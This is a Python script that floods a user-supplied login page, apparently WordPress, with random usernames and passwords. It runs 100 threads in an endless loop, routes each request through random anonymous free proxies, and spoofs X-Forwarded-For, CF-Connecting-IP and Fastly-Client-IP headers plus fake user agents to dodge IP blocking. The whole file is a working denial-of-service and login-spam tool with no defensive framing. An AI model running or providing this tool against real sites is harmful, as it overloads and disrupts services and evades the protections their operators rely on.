import requests
import threading
import random
import string
from termcolor import colored
from faker import Faker
from fp.fp import FreeProxy

# Import the faker library
fake = Faker()

# Get the URL to the login page
url = input("Enter the URL to the login page: ")

# Define the number of concurrent threads
num_threads = 100

# Define function to flood login page with fake creds
def flood_login():
  # Generate a fake IP address and user agent
  fake_ip = fake.ipv4()
  fake_agent = fake.user_agent()

  # Get a random proxy from the scraped proxy list
  try:
    proxy = FreeProxy(anonym=True, rand=True).get()
  except Exception as e:
    print(colored("ERROR: {}".format(str(e)), 'red'))
    return

  # Generate a random username and password
  username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
  password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

  # Make a POST request to the login page with the random username and password
  headers = {"X-Forwarded-For": fake_ip, "Fastly-Client-IP": fake_ip, "CF-Connecting-IP": fake_ip, "User-Agent": fake_agent}
  data = {"log": username, "pwd": password}
  try:
    response = requests.post(url, headers=headers, data=data, proxies={"http": proxy, "https": proxy})
  except Exception as e:
    print(colored("ERROR: {}".format(str(e)), 'red'))
    return

  # Check the response status code to determine if the login attempt was successful
  if response.status_code == 200:
    # Request was successful, report success
    print(colored("SUCCESS: Sent username {} and password {}".format(username, password), 'green'))
  else:
    # Request failed, report status code (site could be down or request blocked)
    print(colored("ERROR: Request failed with status code {}".format(response.status_code), 'red'))

# Create a list of threads
threads = []

while True:
  # Create and start the specified number of threads
  for i in range(num_threads):
    thread = threading.Thread(target=flood_login)
    thread.start()
    threads.append(thread)

  # Wait for all threads to finish
  for thread in threads:
    thread.join()
